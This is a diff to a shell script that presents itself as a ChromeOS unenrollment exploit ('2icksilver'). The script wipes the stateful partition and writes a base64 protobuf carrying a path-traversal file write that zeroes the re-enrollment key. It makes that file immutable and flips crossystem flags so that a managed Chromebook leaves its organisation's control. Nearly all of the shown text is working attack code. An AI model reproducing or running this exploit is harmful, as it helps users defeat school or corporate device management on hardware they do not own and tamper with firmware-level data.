@@ -72,37 +72,28 @@ wipeandmountstate(){
 
 checkcurrentstate(){
     echo "Checking current state..."
-    vpdoutput=$(vpd -i RW_VPD -g "powerwash_count" 2>/dev/null)
-    if [ "$vpdoutput" = "1" ]; then
-        echo "Starting Part 2"
-        part2
-    else
-        echo "Starting Part 1"
-        part1
-    fi
+	mkdir /metadata
+    mount "$intdis_prefix"11 /metadata || part1
+	part2
 }
 
 part1(){
     wipeandmountstate
     mkdir -p "$stateful_mount"/unencrypted
     touch "$stateful_mount"/unencrypted/.default_key_stateful_migration
-    vpd -i RW_VPD -s "powerwash_count"="1"
     crossystem disable_dev_request=1
     umount "$stateful_mount"
     echo "Rebooting, please re-run this script after the update finishes. It may update multiple times, you need to wait for all of them to finish"
-    sleep 10
+    sleep 5
     reboot -f
 }
 
 part2(){
-    mkdir /metadata
-    mount "$intdis_prefix"11 /metadata
     printf "CoABCiN1bmVuY3J5cHRlZC8uLi8uLi8uLi9ydW4vdnBkL3JvLnR4dBBVGlcSVXJlX2Vucm9sbG1lbnRfa2V5PSIwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwImA=" | tee /metadata/preseeder.proto
     chattr +i /metadata/preseeder.proto 
     sync
     umount /metadata
     sync
-    vpd -i RW_VPD -d "powerwash_count"
     crossystem disable_dev_request=1
     echo "Go through setup, you will be unenrolled"
     sleep 5
@@ -120,9 +111,7 @@ main(){
 	fi
   clear
   echo "2icksilver, root file write > unpatch quicksilver > unenrollment"
-	echo "Exploit by emery, script by con"
-  mkdir -p /run/vpd/
-	vpd -i RW_VPD -l > /run/vpd/rw.txt
+  echo "Exploit by emery, script by con"
 	checkcurrentstate
 }
 
